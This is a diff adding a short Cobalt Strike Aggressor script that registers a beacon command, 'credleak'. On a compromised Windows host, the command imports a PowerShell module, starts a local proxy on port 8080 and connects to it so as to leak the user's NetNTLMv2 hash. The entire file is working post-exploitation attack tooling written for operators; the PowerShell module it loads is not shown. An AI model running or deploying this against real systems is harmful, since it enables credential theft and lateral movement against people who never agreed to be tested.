@@ -1,0 +1,18 @@
+# Original idea and code by @leftp
+# https://gist.github.com/leftp/a3330f13ac55f584239baa68a3bb88f2
+# 
+# I took the code and modified it into a usable form.
+# Author: @vysecurity
+
+alias credleak {
+	btask($1, "Starting Proxy server on 8080");
+	bpowershell_import($1, script_resource("Invoke-CredLeak.ps1"));
+	bpowershell($1, "Invoke-ProxyServer");
+	btask($1, "Connecting to proxy in attempt to leak hash");
+	bpowershell($1, "Invoke-CredLeak");
+	blog($1, "Kill the job after the hash has been leaked. Do a shell netstat -ano | findstr /i 8080 then kill the process");
+}
+
+beacon_command_register("credleak", "Starts up a proxy server on 8080 and connects to it to leak NetNTLMv2 hash",
+	"Syntax: credleak\n" .
+	"Starts up a proxy server on localhost:8080 and connects to it to leak NetNTLMv2 hash of the low privilege user");
